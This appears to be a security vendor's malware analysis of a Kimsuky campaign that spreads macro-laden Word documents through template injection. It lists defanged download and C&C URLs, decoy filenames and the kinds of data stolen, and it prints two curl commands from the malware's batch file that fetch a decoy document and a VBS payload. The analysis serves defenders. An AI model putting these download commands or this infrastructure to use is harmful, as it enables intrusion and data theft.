Malware Disguised as Normal Documents (Kimsuky) 
The ASEC analysis team has recently discovered that the malware introduced in the post, <Malware Disguised as a Manuscript Solicitation Letter (Targeting Security-Related Workers)>, is being distributed to broadcasting and ordinary companies as well as those in the security-related field. Identical to the malware introduced in the blog post above, all the malware documents utilize the template injection technique and download malicious word macro documents to execute themselves. The distributed filenames are as follows:

[kbs Sunday Diagnosis] Questionnaire.docx
Im ** Cover Letter.docx
app-planning – copy.docx


External URL found in \word\_rels\settings.xml.rels
To facilitate the execution of the malicious macro code, the threat actor used an image that prompts users to execute the macro. The image has been constantly used since the past and is suspected to be all from the same operator.

Word File Provided as External Link When Replying to Attacker’s Email (Kimsuky)


Prompting users to enable content
Below is a list of download URLS of malicious Word macro documents we have additionally identified.

hxxp://www.hydrotec.co[.]kr/bbs/img/cmg/upload2/init.dotm
hxxp://www.hydrotec.co[.]kr/bbs/img/cmg/upload3/init.dotm
hxxp://jooshineng[.]com/gnuboard4/adm/img/ghp/up/state.dotm
hxxp://gdtech[.]kr/gnuboard4/adm/cmg/attatch/init.dotm
hxxp://ddim.co[.]kr/gnuboard4/adm/cmg/upload/init.dotm

When the malicious macro inside the downloaded document is executed, it generates and runs the version.bat file that contains the curl command. The batch file includes codes that download and execute a normal document and additional malicious script. The used curl commands are as follows.

curl -o “”” & fname & “”” hxxp://gdtech[.]kr/gnuboard4/adm/cmg/upload/state.docx
curl -o %temp%\temp.vbs hxxp://gdtech[.]kr/gnuboard4/adm/cmg/upload/list.php?query=60

Confirmed normal documents disguised themselves cover letters, application proposals, and more.

Normal document – 1

Normal document – 2

Normal document – 3
Identical to the previous findings, the additional malicious script leaks the following data to the C&C server.

Infected PC system information
Information on virus vaccines installed on the system
List of recently opened Word files
Directory information of the download folder in the system
Information of running processes
Modification of IE-related registries
Registration to the task scheduler to maintain a connection to the C&C server

The confirmed C&C URLs are as follows.

hxxp://gdtech[.]kr/gnuboard4/adm/cmg/upload/show.php
hxxp://ddim.co[.]kr/gnuboard4/adm/cmg/upload/show.php
hxxp://www.hydrotec.co[.]kr/bbs/img/cmg/upload3/show.php

Recently, malware cases targeting North Korea-related individuals are also being distributed to ordinary corporate users, calling for their utmost precaution. Users must therefore refrain from viewing emails from unknown senders and take caution so that macros included in Office documents do not run automatically.
